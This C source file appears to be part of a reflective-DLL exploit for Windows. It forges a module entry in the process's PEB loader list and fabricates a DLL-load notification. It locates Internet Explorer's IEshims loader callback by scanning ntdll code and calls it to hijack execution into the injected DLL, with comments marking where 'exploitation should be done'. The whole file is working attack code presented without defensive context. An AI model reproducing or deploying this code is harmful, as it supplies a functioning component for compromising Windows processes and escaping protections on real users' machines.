#include "ReflectiveLoader.h"
#include "ShimsInstaller.h"

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	//PVOID Reserved3[2];
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	//BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	} DUMMYUNIONNAME;
	ULONG TimeDateStamp;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
	// Reserved.
	ULONG Flags;
	// The full path name of the DLL module.
	PUNICODE_STR FullDllName;
	// The base file name of the DLL module.
	PUNICODE_STR BaseDllName;
	// A pointer to the base address for the DLL in memory.
	PVOID DllBase;
	// The size of the DLL image, in bytes.
	ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef void (WINAPI *PNotificationFunc)(UINT, PLDR_DLL_LOADED_NOTIFICATION_DATA);
typedef int (WINAPI *PcshimBindingsHookFunc)(HINSTANCE, UINT, PVOID);
typedef BOOL (WINAPI *PentryPoint)(HINSTANCE, DWORD, LPVOID);

static PMY_LDR_DATA_TABLE_ENTRY fakeLdrEntry = NULL;
static PLDR_DLL_LOADED_NOTIFICATION_DATA fakeNotification = NULL;
static LIST_ENTRY headBackup;

static VOID CreateFakeNotification(HINSTANCE hinstDLL)
{
	fakeNotification = (PLDR_DLL_LOADED_NOTIFICATION_DATA)malloc(sizeof(LDR_DLL_LOADED_NOTIFICATION_DATA));
	fakeNotification->DllBase = hinstDLL;
	fakeNotification->BaseDllName = (PUNICODE_STR)malloc(sizeof(UNICODE_STR));
	fakeNotification->BaseDllName->pBuffer = L"WinRefl.dll";
	fakeNotification->BaseDllName->Length = wcslen(fakeNotification->BaseDllName->pBuffer) * 2;
	fakeNotification->BaseDllName->MaximumLength = fakeNotification->BaseDllName->Length + 2;
	fakeNotification->FullDllName = (PUNICODE_STR)malloc(sizeof(UNICODE_STR));
	fakeNotification->FullDllName->pBuffer = L"WinRefl.dll";
	fakeNotification->FullDllName->Length = wcslen(fakeNotification->FullDllName->pBuffer) * 2;
	fakeNotification->FullDllName->MaximumLength = fakeNotification->FullDllName->Length + 2;
	fakeNotification->SizeOfImage = 0x1b000;
	fakeNotification->Flags = 0;
}

static VOID DeleteFakeNotification() {
	free(fakeNotification->BaseDllName);
	fakeNotification->BaseDllName = NULL;
	free(fakeNotification->FullDllName);
	fakeNotification->FullDllName = NULL;
	free(fakeNotification);
	fakeNotification = NULL;
}

static VOID CreateFakeModule(PMY_LDR_DATA_TABLE_ENTRY templateEntry, PVOID dllBase, PVOID entryPoint)
{
	fakeLdrEntry = (PMY_LDR_DATA_TABLE_ENTRY)malloc(sizeof(MY_LDR_DATA_TABLE_ENTRY));
	memcpy(fakeLdrEntry, templateEntry, sizeof(LDR_DATA_TABLE_ENTRY));
	fakeLdrEntry->DllBase = dllBase;
	fakeLdrEntry->EntryPoint = entryPoint;
	fakeLdrEntry->SizeOfImage = 0x1b000;
	fakeLdrEntry->FullDllName.pBuffer = L"WinRefl.dll";
	fakeLdrEntry->FullDllName.Length = wcslen(fakeLdrEntry->FullDllName.pBuffer) * 2;
	fakeLdrEntry->FullDllName.MaximumLength = fakeLdrEntry->FullDllName.Length + 2;
	fakeLdrEntry->BaseDllName.pBuffer = L"WinRefl.dll";
	fakeLdrEntry->BaseDllName.Length = wcslen(fakeLdrEntry->BaseDllName.pBuffer) * 2;
	fakeLdrEntry->BaseDllName.MaximumLength = fakeLdrEntry->BaseDllName.Length + 2;
}

static VOID DeleteFakeModule()
{ 
	free(fakeLdrEntry);
	fakeLdrEntry = NULL;
}

static VOID UnhookFakeModule()
{
	_PPEB pPeb = (_PPEB)__readfsdword(0x30);

	// Restore the InMemoryOrderModuleList
	pPeb->pLdr->InMemoryOrderModuleList = headBackup;
	pPeb->pLdr->InMemoryOrderModuleList.Flink->Blink = &(pPeb->pLdr->InMemoryOrderModuleList);

	DeleteFakeModule();
}

static VOID HookFakeModule(HINSTANCE hinstDLL, PVOID ep) {
	PentryPoint entryPoint = (PentryPoint)ep;
	_PPEB pPeb = (_PPEB)__readfsdword(0x30);

	LIST_ENTRY head = pPeb->pLdr->InMemoryOrderModuleList;
	// Make Backup to restore later
	headBackup = head;

	PMY_LDR_DATA_TABLE_ENTRY firstEntry = (PMY_LDR_DATA_TABLE_ENTRY)((BYTE *)head.Flink - (ptrdiff_t)8);
	CreateFakeModule(firstEntry, hinstDLL, entryPoint);

	// Insert the fake entry in the InMemoryOrderModuleList
	fakeLdrEntry->InMemoryOrderLinks.Flink = head.Flink;
	fakeLdrEntry->InMemoryOrderLinks.Blink = head.Flink->Blink;
	// Fix the list
	pPeb->pLdr->InMemoryOrderModuleList.Flink->Blink = &(fakeLdrEntry->InMemoryOrderLinks);
	pPeb->pLdr->InMemoryOrderModuleList.Flink = &(fakeLdrEntry->InMemoryOrderLinks);

	return;
}

// Find a pointer to the IEshims!CShimBindings::_LdrNotificationCallback
static SIZE_T SearchLdrNotificationCallback()
{
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	FARPROC registerDllMethod = GetProcAddress(ntdll, "LdrRegisterDllNotification");
	PUCHAR searchPtr = (unsigned char *)registerDllMethod;
	UCHAR testByte = 0x00;
	SIZE_T pNotificationList = 0;
	SIZE_T pNotificationCallback = 0;
	for (int i = 0; i < 0x1000; i++) {
		if (searchPtr[i] == searchPtr[i + 5] + 4 &&
			searchPtr[i + 1] == searchPtr[i + 6] &&
			searchPtr[i + 2] == searchPtr[i + 7] &&
			searchPtr[i + 3] == searchPtr[i + 8]) {
			searchPtr = searchPtr + i;
			pNotificationList = *(SIZE_T *)searchPtr;
			break;
		}
		if (searchPtr[i] == searchPtr[i + 6] + 4 &&
			searchPtr[i + 1] == searchPtr[i + 7] &&
			searchPtr[i + 2] == searchPtr[i + 8] &&
			searchPtr[i + 3] == searchPtr[i + 9]) {
			searchPtr = searchPtr + i;
			pNotificationList = *(SIZE_T *)searchPtr;
			break;
		}
	}

	memcpy(&pNotificationCallback, (SIZE_T *)pNotificationList, sizeof(SIZE_T));
	pNotificationCallback += sizeof(SIZE_T) * 2;

	return pNotificationCallback;
}

VOID InstallShims(HINSTANCE hinstDLL, PVOID ep, LPVOID lpReserved) {
	ULONG notificationStruct = 0;
	PcshimBindingsHookFunc cshimBindingsHookFunc = NULL;
	PNotificationFunc notificationCallback = NULL;
	
	// Create and Hook fake entry in the InMemoryOrderModuleList
	HookFakeModule(hinstDLL, ep);

	// Create a fake LDR_DLL_LOADED_NOTIFICATION_DATA
	CreateFakeNotification(hinstDLL);

	// Find IEshims!CShimBindings::_LdrNotificationCallback
	memcpy(&notificationCallback, (PVOID)SearchLdrNotificationCallback(), sizeof(PVOID));

	// Call the IEshims!CShimBindings::_LdrNotificationCallback with the fake notification. 
	// It should install CShimBindings::s_DllMainHook as entry point on the fake LDR_DATA_TABLE_ENTRY
	notificationCallback(LDR_DLL_NOTIFICATION_REASON_LOADED, fakeNotification);

	// Disclose the address of CShimBindings::s_DllMainHook
	memcpy(&cshimBindingsHookFunc, &(fakeLdrEntry->EntryPoint), sizeof(SIZE_T));

	// Call  CShimBindings::s_DllMainHook by ourselves
	// It should hijack our Reflective DLL and call the reflective entry point again...
	cshimBindingsHookFunc(hinstDLL, DLL_PROCESS_ATTACH, lpReserved);

	// At this moment exploitation should be done, we free the fake LDR_DLL_LOADED_NOTIFICATION_DATA 
	DeleteFakeNotification();

	// And finally Unhook the InMemoryOrderModuleList and free the resource
	UnhookFakeModule();

	ExitThread(0);
}